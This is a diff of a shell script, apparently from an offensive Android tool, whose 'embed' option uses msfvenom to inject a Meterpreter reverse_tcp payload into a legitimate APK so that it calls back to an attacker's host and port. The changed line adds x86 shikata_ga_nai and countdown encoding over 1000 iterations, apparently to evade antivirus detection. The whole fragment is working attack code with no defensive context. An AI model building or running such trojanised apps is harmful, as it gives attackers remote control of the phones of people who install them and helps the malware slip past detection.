@@ -44,7 +44,7 @@ case $opts in
 		;;
 	embed)
 		PAYLOAD=android/meterpreter/reverse_tcp
-		$user msfvenom -x $apk -p $PAYLOAD LHOST=$HOST LPORT=$PORT -a dalvik --platform android -o $apk-$opts >/dev/null || exit
+		$user msfvenom -x $apk -a dalvik --platform android -p $PAYLOAD LHOST=$HOST LPORT=$PORT -e x86/shikata_ga_nai -e x86/countdown -i 1000 -o $apk-$opts >/dev/null || exit
 		handlerRC
 		;;
 	payapk)
